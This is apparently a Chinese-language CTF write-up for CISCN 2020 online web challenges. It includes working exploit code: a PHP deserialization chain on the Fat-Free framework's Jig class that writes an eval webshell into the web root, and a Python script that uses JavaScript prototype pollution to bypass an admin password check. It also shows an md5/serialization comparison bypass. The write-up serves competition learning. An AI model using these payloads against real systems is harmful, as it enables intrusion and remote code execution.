---
title: ciscn2020_online
author: ch3n9w
date: 2020-08-20 13:16:50
categories: CTF
typora-root-url: ../
---

> web越來越没有牌面了...国赛果然是pwn和misc的天下

<!--more-->

## easyphp

要让子进程异常退出, 先打印出php的所有内置函数然后爆破发包发现这个函数可以让他异常退出

```
a=stream_socket_server
```



![image-20211114141205658](/images/ciscn2020-online/image-20211114141205658.png)



## babyunserialize

传入flag并对flag进行反序列化, 搜索``__destruct``函数后决定用``jip.php``

```php
        function __destruct() {
                if ($this->lazy) {
                        $this->lazy = FALSE;
                        foreach ($this->data?:[] as $file => $data)
                                $this->write($file,$data);
                }
        }

```

```php
        function write($file,array $data=NULL) {
                if (!$this->dir || $this->lazy)
                        return count($this->data[$file]=$data);
                $fw=\Base::instance();
                switch ($this->format) {
                        case self::FORMAT_JSON:
                                $out=json_encode($data,JSON_PRETTY_PRINT);
                                break;
                        case self::FORMAT_Serialized:
                                $out=$fw->serialize($data);
                                break;
                }
                return $fw->write($this->dir.$file,$out);
        }

```



exp如下

```php
<?php
namespace DB{
class jig{
    const
        FORMAT_JSON=1,
        FORMAT_Serialized=0;
    protected $dir;
    protected $data;
    protected $lazy;
    protected $format;
    public function __construct($dir,$data,$lazy)
    {
        $this->data = $data;
        $this->dir = $dir;
        $this->lazy = $lazy;
        $this->format = 0;
    }
}
}

namespace ddd{
$a = new \DB\jig("/var/www/html/", ["kkk.php"=> ['<?php eval($_POST[1]);?>']], True);
echo urlencode(serialize($a));

}
?>

```

## littlegame

javascript原型链污染

关键代码

```javascript
router.post("/DeveloperControlPanel", function (req, res, next) {
    // not implement
    if (req.body.key === undefined || req.body.password === undefined){
        res.send("What's your problem?");
    }else {
        let key = req.body.key.toString();
        let password = req.body.password.toString();
        if(Admin[key] === password){
            res.send(process.env.flag);
        }else {
            res.send("Wrong password!Are you Admin?");
        }
    }

});
router.get('/SpawnPoint', function (req, res, next) {
    req.session.knight = {
        "HP": 1000,
        "Gold": 10,
        "Firepower": 10
    }
    res.send("Let's begin!");
});
router.post("/Privilege", function (req, res, next) {
    // Why not ask witch for help?
    if(req.session.knight === undefined){
        res.redirect('/SpawnPoint');
    }else{
        if (req.body.NewAttributeKey === undefined || req.body.NewAttributeValue === undefined) {
            res.send("What's your problem?");
        }else {
            let key = req.body.NewAttributeKey.toString();
            let value = req.body.NewAttributeValue.toString();
            setFn(req.session.knight, key, value);
            res.send("Let's have a check!");
        }
    }
});

```

污染``req.session.knight``

exp如下

```python
import requests

url = "http://eci-2ze9505q64pi24hxhzqj.cloudeci1.ichunqiu.com:8888/"

data1 = {
    "NewAttributeKey":"constructor.prototype.ch3n9w",
    "NewAttributeValue":"1234"
}

data2 = {
    "key":'ch3n9w',
    'password':'1234'
}

sess = requests.Session()
sess.get(url+"SpawnPoint")
sess.post(url+"Privilege",data=data1)
r = sess.post(url+"DeveloperControlPanel",data=data2)

print(r.text)
```

## rceme

搜索发现https://www.anquanke.com/post/id/212603#h2-0, 拿着payload直接打就可以了



## easytrick

```php
<?php
class trick{
    public $trick1;
    public $trick2;
    public function __construct($a, $b)
    {
        $this->trick1 = $a;
        $this->trick2 = $b;
    }
    public function __destruct(){
        $this->trick1 = (string)$this->trick1;
        if(strlen($this->trick1) > 5 || strlen($this->trick2) > 5){
            die("你太长了");
        }
        if($this->trick1 !== $this->trick2 && md5($this->trick1) === md5($this->trick2) && $this->trick1 != $this->trick2){
            echo file_get_contents("/flag");
        }
    }
}

$a = new trick(INF, INF);
echo urlencode(serialize($a));
```



